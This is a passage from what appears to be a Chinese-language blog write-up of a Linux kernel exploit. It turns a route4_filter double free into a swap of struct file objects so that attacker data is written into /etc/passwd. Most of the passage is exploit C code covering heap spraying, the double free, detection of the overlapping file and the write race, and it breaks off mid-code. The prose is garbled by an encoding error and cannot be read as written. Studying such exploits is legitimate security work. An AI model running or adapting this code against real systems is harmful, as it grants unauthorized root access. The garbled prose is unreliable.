<li>å…ˆå­˜åœ¨ä¸€ä¸ªè¿›ç¨‹å‘ä¸€ä¸ªå¯å†™æ–‡ä»¶å†™å…¥å¤§é‡å†…å®¹ï¼Œinodeé”ä¼šé”ä½è¾ƒé•¿æ—¶é—´</li>
<li>ç¬¬äºŒä¸ªè¿›ç¨‹å°è¯•å‘è¯¥æ–‡ä»¶å†™å…¥â€æ‰“ç®—å†™å…¥/etc/passwdç­‰ç‰¹æƒæ–‡ä»¶çš„å†…å®¹â€</li>
<li>ç¬¬ä¸‰ä¸ªè¿›ç¨‹åˆ©ç”¨æ¼æ´æ›¿æ¢fileç»“æ„ä½“</li>
</ol>
<p>åˆ°è¿™é‡Œå¯¹struct fileçš„æ”»å‡»å°±å·²ç»é—­ç¯äº†ã€‚</p>
<h5 id="struct-cred"><a href="#struct-cred" class="headerlink" title="struct cred"></a>struct cred</h5><p>å¯¹äºfileç±»å‹å‡­æ®æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ™®é€šç”¨æˆ·å¯è¯»ç‰¹æƒç”¨æˆ·å¯å†™çš„/etc/passwdæ¥è¿›è¡Œæ“ä½œï¼Œæ™®é€šç”¨æˆ·å°±å¯ä»¥å–·å°„å¤§é‡ç›®æ ‡ç”¨äºæ”»å‡»ã€‚ä½†ç‰¹æƒçš„struct credå°±æ²¡é‚£ä¹ˆå®¹æ˜“äº†ã€‚å¯ä»¥é€šè¿‡ï¼š</p>
<p>æ‰§è¡Œå¤§é‡suid ç¨‹åºï¼Œå¦‚sudo(ä½†å¤§éƒ¨åˆ†æƒ…å†µä¸‹å¹¶æ²¡æœ‰è¿™ä¸ªæƒé™)<br>ä½¿ç”¨kernel threadï¼Œkernel è‡ªå·±åˆ›å»ºçš„ä»»åŠ¡æ˜¯ç‰¹æƒä»»åŠ¡ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸€äº›å†…æ ¸æ¥å£æ§åˆ¶å†…æ ¸å¯åŠ¨ä¸€å †kernel threadï¼š</p>
<ul>
<li>åˆ©ç”¨workqueue</li>
<li>åˆ©ç”¨usermode helper</li>
</ul>
<h3 id="reading-exp"><a href="#reading-exp" class="headerlink" title="reading exp"></a>reading exp</h3><p>ç»ˆäºåˆ°äº†é˜…è¯»expçš„é˜¶æ®µäº†ï¼Œè·ç¦»å†™ä¸‹è¿™ç¯‡æ–‡ç« çš„ç¬¬ä¸€è¡Œä¼¼ä¹å·²ç»è¿‡äº†ä¸¤å‘¨äº†ã€‚ã€‚ã€‚ä»¤äººæ„Ÿå¹ã€‚</p>
<p>è¿›ç¨‹Aï¼Œéšæ—¶å‡†å¤‡å–·å°„<code>/etc/passwd</code>æ–‡ä»¶</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">// 12. Thread 3 - spray 4096*2 priviledged `file` objects to replace unprivileged `file` (wait pipe_file_spray[0])</span></span><br><span class="line">    adjust_rlimit();</span><br><span class="line">    <span class="keyword">int</span> spray_num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (read(pipe_file_spray[<span class="number">0</span>][<span class="number">0</span>], &amp;spray_num, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)) &lt; <span class="keyword">sizeof</span>(<span class="keyword">int</span>))   <span class="comment">// use pipe_file_spray to notify</span></span><br><span class="line">      err(<span class="number">1</span>, <span class="string">&quot;[-] read file spray&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[12] got cmd, start spraying 4096*2 `file` by opening %s\n&quot;</span>, target);</span><br><span class="line">    spray_num = <span class="number">4096</span>;</span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123;  <span class="comment">// spray 4096 `file` (parent-process)</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; spray_num; i++) &#123;</span><br><span class="line">        pin_on_cpu(i % cpu_cores);</span><br><span class="line">        open(target, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> (<span class="number">1</span>) &#123;sleep(<span class="number">10000</span>);&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢æ˜¯è¿›ç¨‹Bçš„ä»£ç ï¼Œä½†æ˜¯åœ¨è¿›ç¨‹Bæ‰§è¡Œä¹‹å‰å¾—ç­‰è¿›ç¨‹Cæ‰§è¡Œå®Œï¼Œè¿›ç¨‹Cå°±æ˜¯å †å–·ä¸€å †<code>struct file</code>æ¥è€—å°½<code>file slab</code>ä¸­çš„ç©ºé—²objectï¼Œè¿›ç¨‹Bå°±æ˜¯å¹²äº†ä¸€ä»¶äº‹ï¼Œå †å–·å¾ˆå¤šçš„<code>route4_filter </code>,ç„¶åæŠŠä»–é‡Šæ”¾æ‰ï¼Œä½†æ˜¯å®ƒç”³è¯·çš„handleréƒ½ä¸ä¸º0.æ‰€ä»¥åªèµ·äº†ä¸€ä¸ªè€—å°½é€šç”¨slabçš„objçš„ä½œç”¨ï¼Œç­‰åé¢å…¨éƒ¨freeçš„æ—¶å€™å°±ä¼šæŠŠå¯¹åº”é¡µäº¤ç»™ä¼™ä¼´ç³»ç»Ÿäº†ã€‚</p>
<p>ä½†æˆ‘å…¶å®ä¸æ˜¯å¾ˆèƒ½ç†è§£ä¸ºä»€ä¹ˆè¦è®¾ç½®<code>user namespace</code>ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">setup_namespace();</span><br><span class="line">      pin_on_cpu(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">int</span> sprayfd = socket(PF_NETLINK, SOCK_RAW, <span class="number">0</span>);</span><br><span class="line">      assert(sprayfd != <span class="number">-1</span>);</span><br><span class="line">      add_qdisc(sprayfd);</span><br><span class="line"><span class="comment">// 2-1. prepare payload</span></span><br><span class="line">      <span class="keyword">char</span> msg[<span class="number">0x10</span>] = &#123;&#125;;</span><br><span class="line">      <span class="keyword">char</span> payload[<span class="number">256</span>] = &#123;&#125;;</span><br><span class="line">      <span class="built_in">memset</span>(payload + <span class="number">0x10</span>, <span class="string">&#x27;A&#x27;</span>, <span class="number">256</span> - <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (read(pipe_defrag[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] failed read defrag&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// if the exploit keeps failing, please tune the middle and end</span></span><br><span class="line">      <span class="keyword">int</span> middle = <span class="number">38</span>;       <span class="comment">// 38</span></span><br><span class="line">      <span class="keyword">int</span> end = middle + <span class="number">40</span>; <span class="comment">// 40</span></span><br><span class="line"><span class="comment">// 2-2. spray (38+3)*32 filters in kmalloc-192 &amp; kmalloc-256</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[2] spray (38+3)*32 kmalloc-192 &amp; kmalloc-256\n&quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; middle; i++)</span><br><span class="line">        add_tc_basic(sprayfd, i + <span class="number">1</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">      add_tc_basic(sprayfd, middle + <span class="number">1</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">      add_tc_basic(sprayfd, middle + <span class="number">2</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">      add_tc_basic(sprayfd, middle + <span class="number">3</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">      <span class="keyword">if</span> (write(pipe_child[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] write to parent\n&quot;</span>);</span><br><span class="line"><span class="comment">// 4. spray more filters in kmalloc-192 &amp; kmalloc-256</span></span><br><span class="line">      <span class="keyword">if</span> (read(pipe_parent[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] read from parent&quot;</span>);</span><br><span class="line">      <span class="comment">// add_tc_basic(sprayfd, middle+2, payload, 129, 32);</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// prepare another part for cross cache</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[4] spray kmalloc-192 &amp; kmalloc-256\n&quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = middle + <span class="number">2</span>; i &lt; end; i++)</span><br><span class="line">        add_tc_basic(sprayfd, i + <span class="number">1</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line"><span class="comment">// 5. free (end-24)*32 kmalloc-192 &amp; kmalloc-256</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[5] free (end-24)*32 kmalloc-192 &amp; kmalloc-256\n&quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; end - <span class="number">24</span>; i++) &#123;</span><br><span class="line">        <span class="comment">// prevent double free of 192 and being reclaimed by others</span></span><br><span class="line">        <span class="keyword">if</span> (i == middle || i == middle + <span class="number">1</span>)</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        delete_tc_basic(sprayfd, i + <span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (write(pipe_child[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] write to parent\n&quot;</span>);</span><br><span class="line"><span class="comment">// 7. free (end-middle+1)*32 kmalloc-192 &amp; kmalloc-256</span></span><br><span class="line">      <span class="keyword">if</span> (read(pipe_parent[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] read from parent&quot;</span>);</span><br><span class="line">      <span class="comment">// if (cpu_cores == 1) sleep(1);</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[7] free (end-middle+1)*32 kmalloc-192 &amp; kmalloc-256\n&quot;</span>);</span><br><span class="line">      delete_tc_basic(sprayfd, middle + <span class="number">2</span>);</span><br><span class="line">      delete_tc_basic(sprayfd, middle + <span class="number">3</span>);</span><br><span class="line">      delete_tc_basic(sprayfd, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = middle + <span class="number">2</span>; i &lt; end; i++)</span><br><span class="line">        delete_tc_basic(sprayfd, i + <span class="number">1</span>);</span><br><span class="line">      <span class="comment">//getchar();</span></span><br><span class="line">      <span class="keyword">if</span> (write(pipe_child[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] write to parent\n&quot;</span>);</span><br><span class="line">      <span class="keyword">while</span> (<span class="number">1</span>) &#123;sleep(<span class="number">1000</span>);&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è¿›ç¨‹Dæ˜¯å…³é”®è¿›ç¨‹ï¼Œé¦–å…ˆç¡®å®šå·²ç»å¯ä»¥doublefreeäº†ï¼Œç„¶åå–·å°„ä¸€å †ä½å‡­è¯file,æ¥ç€ç¬¬ä¸€æ¬¡kfreeå¤§å°ä¸º0x100çš„obj,ç„¶åå–·å°„ä¸€å †ä½å‡­è¯fileæ‹¿åˆ°åˆšfreeçš„obj,æ¥ç€doublefreeè¿™ä¸ªobj,ç„¶åå†å–·å°„ä½å‡­è¯file,è¿™æ ·å°±æœ‰ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦æŒ‡å‘åŒä¸€ä¸ªfileè€Œä¸”è¿™ä¸ªfileçš„f_countä¸º1ï¼Œæ¥ç€å¼€å¯ä¸‰ä¸ªçº¿ç¨‹ï¼Œæ›¿æ¢ç¬¬å‡­è¯ä¸ºé«˜å‡­è¯ï¼Œå‰é¢æˆ‘å·²ç»è¯´è¿‡è¿‡ç¨‹äº†ï¼Œå°±ä¸èµ˜è¿°äº†.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">slow_write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[11-1] start slow write\n&quot;</span>);</span><br><span class="line">  <span class="keyword">clock_t</span> start, end;</span><br><span class="line">  <span class="keyword">int</span> fd = open(<span class="string">&quot;./uaf&quot;</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] error open uaf file&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> addr = <span class="number">0x30000000</span>;</span><br><span class="line">  <span class="keyword">int</span> offset;</span><br><span class="line">  <span class="keyword">for</span> (offset = <span class="number">0</span>; offset &lt; <span class="number">0x80000</span> / <span class="number">20</span>; offset++) &#123;     <span class="comment">// mmap space [0x30000000, 0x30000000 + 0x1000 * 0x80000 / 20]</span></span><br><span class="line">    <span class="keyword">void</span> *r = mmap((<span class="keyword">void</span> *)(addr + offset * <span class="number">0x1000</span>), <span class="number">0x1000</span>,</span><br><span class="line">                   PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (r &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-] allocate failed at 0x%x\n&quot;</span>, offset);</span><br><span class="line">  &#125;</span><br><span class="line">  assert(offset &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *mem = (<span class="keyword">void</span> *)(addr);</span><br><span class="line">  <span class="built_in">memcpy</span>(mem, <span class="string">&quot;hhhhh&quot;</span>, <span class="number">5</span>);</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span>[20];</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++) &#123; <span class="comment">// write plenty of data (0x80000 * 0x1000 = 0x80 000 000 = 2GB)</span></span><br><span class="line">    iov[i].iov_base = mem;</span><br><span class="line">    iov[i].iov_len = offset * <span class="number">0x1000</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  run_write = <span class="number">1</span>;    <span class="comment">// notifiy thread 2 (unprivileged `file`) begin to write evil data</span></span><br><span class="line">  start = clock();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (writev(fd, iov, <span class="number">20</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    perror(<span class="string">&quot;slow write&quot;</span>);</span><br><span class="line">  end = clock();</span><br><span class="line">  <span class="keyword">double</span> spent = (<span class="keyword">double</span>)(end - start) / CLOCKS_PER_SEC;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] write done, spent %f s\n&quot;</span>, spent);</span><br><span class="line">  run_write = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// write_cmd() â€”â€” thread 2: write evil data to the privileged file</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">write_cmd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123;.iov_base = content, .iov_len = <span class="built_in">strlen</span>(content)&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (!run_write) &#123;&#125;  <span class="comment">// wait for thread 1 to prepare write</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[11-2] write evil data after the slow write\n&quot;</span>);</span><br><span class="line">  run_spray = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (writev(overlap_a, &amp;iov, <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] failed to write\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> msg[<span class="number">0x10</span>] = &#123;&#125;;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">old_lim</span>, <span class="title">lim</span>, <span class="title">new_lim</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Get old limits</span></span><br><span class="line">  <span class="keyword">if</span> (getrlimit(RLIMIT_NOFILE, &amp;old_lim) == <span class="number">0</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Old limits -&gt; soft limit= %ld \t&quot;</span></span><br><span class="line">           <span class="string">&quot; hard limit= %ld \n&quot;</span>,</span><br><span class="line">           old_lim.rlim_cur, old_lim.rlim_max);</span><br><span class="line">  pin_on_cpu(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] starting exploit, num of cores: %d\n&quot;</span>, cpu_cores);</span><br><span class="line">  <span class="comment">// open &amp; setup the socket</span></span><br><span class="line">  sockfd = socket(PF_NETLINK, SOCK_RAW, <span class="number">0</span>);</span><br><span class="line">  assert(sockfd != <span class="number">-1</span>);</span><br><span class="line">  add_qdisc(sockfd);</span><br><span class="line"><span class="comment">// 3. allocate a route4_filter (vulnerable object)</span></span><br><span class="line">  <span class="keyword">if</span> (read(pipe_child[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">&quot;[-] read from parent&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[3] allocate the vulnerable filter\n&quot;</span>);</span><br><span class="line">  add_tc_(sockfd, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, NLM_F_EXCL | NLM_F_CREATE);  <span class="comment">// handle = 0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (write(pipe_parent[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">&quot;[-] write to child&quot;</span>);</span><br><span class="line"><span class="comment">// 6. 1st free the route4_filter, return the `kmalloc-256` page to the page allocator</span></span><br><span class="line">  <span class="keyword">if</span> (read(pipe_child[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">&quot;[-] read from parent&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// free the object, to free the slab</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[6] 1st freed the filter object\n&quot;</span>);</span><br><span class="line">  <span class="comment">// getchar();</span></span><br><span class="line">  add_tc_(sockfd, <span class="number">0x11</span>, <span class="number">0x12</span>, <span class="number">0</span>, NLM_F_CREATE);         <span class="comment">// handle = 0</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// wait for the vulnerable object being freed</span></span><br><span class="line">  usleep(<span class="number">500</span> * <span class="number">1000</span>);</span><br><span class="line">  <span class="keyword">if</span> (write(pipe_parent[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">&quot;[-] write to child&quot;</span>);</span><br><span class="line"><span class="comment">// 8. spray 4000 unprivileged `file`</span></span><br><span class="line">  <span class="keyword">if</span> (read(pipe_child[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">&quot;[-] read from parent&quot;</span>);</span><br><span class="line"></span><br><span class="line">  usleep(<span class="number">1000</span> * <span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[8] spray 4000 uprivileged `file`\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; spray_num_1; i++) &#123;</span><br><span class="line">    pin_on_cpu(i % cpu_cores);</span><br><span class="line">    fds[i] = open(<span class="string">&quot;./data2&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    assert(fds[i] &gt; <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// printf(&quot;pause before 2nd free\n&quot;);</span></span><br><span class="line">  <span class="comment">// getchar();</span></span><br><span class="line"><span class="comment">// 9. 2nd free route4_filter, which will free the file</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[9] 2nd free the filter object\n&quot;</span>);</span><br><span class="line">  add_tc_(sockfd, <span class="number">0x11</span>, <span class="number">0x13</span>, <span class="number">0</span>, NLM_F_CREATE);         <span class="comment">// handle = 0</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;pause after 2nd free\n&quot;</span>);</span><br><span class="line">  <span class="comment">// getchar();</span></span><br><span class="line">  <span class="comment">// sleep(10000);</span></span><br><span class="line">  usleep(<span class="number">1000</span> * <span class="number">100</span>);   <span class="comment">// should not sleep too long, otherwise file might be claimed by others</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 10. spray 5000 unprivileged `file` &amp; find the overlapped file</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[10] spraying 5000 unprivileged `file`\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; spray_num_2; i++) &#123;</span><br><span class="line">    pin_on_cpu(i % cpu_cores);</span><br><span class="line">    fd_2[i] = open(<span class="string">&quot;./uaf&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    assert(fd_2[i] &gt; <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; spray_num_1; j++) &#123;</span><br><span class="line"><span class="comment">// 10-1. spray one `file` &amp; use kcmp to check if we take up the vulnerable object</span></span><br><span class="line">      <span class="keyword">if</span> (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, fds[j], fd_2[i]) == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[10-1] found overlapped file, id : %d, %d\n&quot;</span>, i, j);</span><br><span class="line">        overlap_a = fds[j];</span><br><span class="line">        overlap_b = fd_2[i];</span><br><span class="line"><span class="comment">// 11. start 2 threads: Thread 1-take up write lock; Thread 2-write evil data</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[11] start 2 threads compete to write\n&quot;</span>);</span><br><span class="line">        <span class="keyword">pthread_t</span> pid, pid2;</span><br><span class="line">        pthread_create(&amp;pid, <span class="literal">NULL</span>, slow_write, <span class="literal">NULL</span>);</span><br><span class="line">        pthread_create(&amp;pid2, <span class="literal">NULL</span>, write_cmd, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (!run_spray) &#123;&#125;</span><br><span class="line"><span class="comment">// 12. spray privileged `file` object</span></span><br><span class="line">        close(overlap_a);     <span class="comment">// ??????????? why release twice ???????????</span></span><br><span class="line">        close(overlap_b);</span><br><span class="line"></span><br><span class="line">        usleep(<span class="number">1000</span> * <span class="number">100</span>);</span><br><span class="line">        <span class="keyword">int</span> spray_num = <span class="number">4096</span>;</span><br><span class="line">        write(pipe_file_spray[<span class="number">0</span>][<span class="number">1</span>], &amp;spray_num, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">        <span class="keyword">if</span> (read(pipe_file_spray[<span class="number">1</span>][<span class="number">0</span>], &amp;msg, <span 